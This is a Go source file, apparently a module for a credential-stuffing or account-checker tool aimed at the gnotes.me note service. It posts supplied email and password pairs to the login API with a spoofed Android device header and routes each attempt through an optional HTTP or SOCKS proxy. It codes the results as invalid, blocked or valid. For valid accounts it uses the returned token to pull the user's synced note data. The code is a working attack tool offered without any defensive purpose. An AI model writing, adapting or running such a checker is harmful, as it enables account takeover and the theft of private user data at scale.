package handlers

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"h12.io/socks"
)

type ExecuteOutput struct {
	Status int    `json:"status"`
	Log    string `json:"log,omitempty"`
}

type ExecuteInput struct {
	Email     string `json:"email"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Pin       string `json:"pin"`
	Data      string `json:"data"`
	TimeOut   int64  `json:"timeout"`
	ProxyHost string `json:"proxy_host"`
	ProxyPort int    `json:"proxy_port"`
	ProxyType int    `json:"proxy_type"`
}

func generateString(length int) string {
	str := "c"

	rand.Seed(time.Now().UnixNano())
	for i := 1; i < length; i++ {
		if rand.Intn(2) == 0 {
			char := rune(rand.Intn(6) + 'a')
			str += string(char)
		} else {
			digit := rune(rand.Intn(10) + '0')
			str += string(digit)
		}
	}
	return str
}

func getSocksType(t int) string {
	if t == 19 {
		return "socks4"
	} else {
		return "socks5"
	}
}

func setProxy(c *http.Client, p *ExecuteInput) {
	var tr http.Transport
	if p.ProxyType == 18 {
		tr.Proxy = http.ProxyURL(&url.URL{
			Scheme: "http",
			Host:   p.ProxyHost + ":" + strconv.Itoa(p.ProxyPort),
		})
	} else if p.ProxyType == 19 || p.ProxyType == 20 {
		timeout := time.Millisecond * time.Duration(p.TimeOut)
		tr.Dial = socks.Dial(fmt.Sprintf("%s://%s:%d?timeout=%s", getSocksType(p.ProxyType), p.ProxyHost, p.ProxyPort, timeout.String()))
	}
	c.Transport = &tr
}

func Pars(T_, ForS, _T string) *string {
	if T_ == "" || ForS == "" || _T == "" {
		return nil
	}

	a := strings.Index(ForS, T_)
	if a == -1 {
		return nil
	}

	a = a + len(T_)
	ForS = ForS[a:]

	b := strings.Index(ForS, _T)
	if b == -1 {
		return nil
	}

	res := ForS[:b]
	return &res
}

func SendRequest(sIN *ExecuteInput, sOUT *ExecuteOutput) {
	requestBody := []byte(fmt.Sprintf(`{"username":"%s","password":"%s"}`, sIN.Email, sIN.Password))
	req, err := http.NewRequest("POST", "https://api.gnotes.me/api/v2/user/signon", bytes.NewBuffer(requestBody))
	if err != nil {
		sOUT.Status = 28
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Device", "X-Device: android, ASUS_Z01QD, 1845, "+generateString(16))

	client := new(http.Client)
	client.Timeout = time.Millisecond * time.Duration(sIN.TimeOut)
	if (sIN.ProxyType > 17) && (sIN.ProxyType < 21) {
		setProxy(client, sIN)
	}
	response, err := client.Do(req)
	if err != nil {
		sOUT.Status = 27
		return
	}
	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		sOUT.Status = 28
		return
	}
	html := string(body)

	if strings.Contains(html, "username_not_exist") || strings.Contains(html, "username_password_not_match") {
		sOUT.Status = 26
	} else if response.StatusCode == http.StatusForbidden {
		sOUT.Status = 27
	} else if strings.Contains(html, "token") {
		sOUT.Status = 25
		token := Pars(`"token":"`, html, `"`)

		req.Method = "GET"
		req.URL, _ = url.Parse("https://api.gnotes.me/api/v3/batch/check/0")
		req.Body = nil
		req.Header.Set("Authorization", "OAuth "+*token)
		req.ContentLength = 0

		response, err := client.Do(req)
		if err != nil {
			sOUT.Status = 27
			return
		}
		defer response.Body.Close()
		body, err := io.ReadAll(response.Body)

		if err != nil {
			sOUT.Status = 28
			return
		}
		html := string(body)
		if strings.Contains(html, "exceed_sync_limit") {
			sOUT.Status = 33
			return
		}

		str := Pars(`"update":[`, html, "]}")
		if str != nil {
			sOUT.Log = *str
			sOUT.Status = 30
		}
	}
}

func ExecuteModule(c *fiber.Ctx) error {
	resp := ExecuteOutput{Status: 28}
	data := new(ExecuteInput)

	err := json.Unmarshal(c.Body(), data)
	if err == nil {
		SendRequest(data, &resp)
	}

	return c.JSON(resp)
}
